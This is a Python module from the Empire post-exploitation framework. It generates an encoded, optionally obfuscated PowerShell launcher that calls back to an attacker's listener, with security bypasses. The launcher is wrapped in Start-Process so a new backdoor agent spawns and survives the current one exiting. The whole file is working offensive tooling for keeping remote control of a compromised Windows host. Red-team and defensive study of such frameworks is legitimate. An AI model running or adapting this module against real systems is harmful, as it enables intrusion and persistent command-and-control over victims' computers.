from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        sys_wow64 = params['SysWow64']

        # staging options
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # generate the launcher script
        launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                       obfuscate=obfuscate,
                                                       obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                       proxy=proxy,
                                                       proxyCreds=proxy_creds, bypasses=params['Bypasses'])

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:
            # transform the backdoor into something launched by powershell.exe
            # so it survives the agent exiting  
            if sys_wow64.lower() == "true":
                stager_code = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
            else:
                stager_code = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher

            parts = stager_code.split(" ")

            script = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listener_name)

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
